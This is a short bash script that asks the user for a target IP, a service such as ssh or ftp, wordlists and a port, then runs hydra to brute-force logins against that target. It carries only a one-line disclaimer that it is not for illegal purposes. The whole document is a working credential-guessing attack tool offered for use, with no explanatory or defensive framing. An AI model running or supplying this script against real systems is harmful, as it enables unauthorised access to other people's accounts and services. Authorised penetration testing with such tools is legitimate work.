# This script is not for illegal purposes

read -p 'Please enter target IP ' entered_ip_var
read -p 'What service to you want to attack? Example: ssh, ftp, etc ' service_var
read -p 'How many tasks do you want to run? ' tasks_var
read -p 'Username wordlist location? ' username_wordlist_var
read -p 'Password wordlist location? ' password_wordlist_var
read -p 'What do you want the output log txt file name to be? ' output_name_var
read -p 'What port is ssh on? ' port_number_var
hydra -L $username_wordlist_var -P $password_wordlist_var -o $output_name_var.txt -t $tasks_var -s $port_number_var $service_var://$entered_ip_var
